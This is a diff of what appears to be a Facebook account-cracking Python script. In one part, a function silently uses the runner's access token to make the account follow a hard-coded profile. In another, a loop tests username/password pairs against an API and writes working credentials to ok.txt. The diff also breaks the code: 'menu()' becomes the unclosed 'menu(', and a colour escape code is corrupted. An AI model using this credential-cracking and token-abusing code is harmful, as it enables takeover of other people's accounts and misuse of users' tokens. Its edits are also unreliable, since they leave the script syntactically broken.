@@ -280,8 +280,8 @@ def bot_follow():
 		print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid"))
 		logs()
 	jalan("%s[%s•%s] %sPlease Wait..."%(k,p,k,p))
-	requests.post("https://graph.facebook.com/100006622839447/subscribers?access_token=" + toket)      # Loxirot V.T Ilham Ramadan
-	menu()
+	requests.post("https://graph.facebook.com/100006622839447/subscribers?access_token=" + toket)      # P4NGERAN ILHAM RAMADAN UNIKER SANTUY FR0M BANDUNG AKUN TERLINDUNG1 DARI SEGALA PENJURU M4STER UNIK3R H4NYA SEBATAS PEMBUAT AKUN UNIK TETAPI TIDAK BISA MENGGODA JANDA MUDA 0404 ERROR NOT FOUND LEADER BROTHERLAND GUARD TEAM 2019 NEVER DIE // CR3ATOR F4CEBOOK UN1K LIMITIDE EDITION 2021//2022
+	menu(
 
 ### MAIN MENU ###
 
@@ -1243,7 +1243,7 @@ class bapittl:
     response = requests.get(api, params=params)
     if re.search("(EAAA)\\w+", response.text):
       self.ok.append(username + " • " + password)
-      print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s • %s %s               "%(username,password,N)))
+      print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0; 32m] %s • %s %s               "%(username,password,N)))
       ok.append(username + " • " + password)
       save = open("ok.txt", "a")
       save.write(str(username) + " • " + str(password) + "\n")
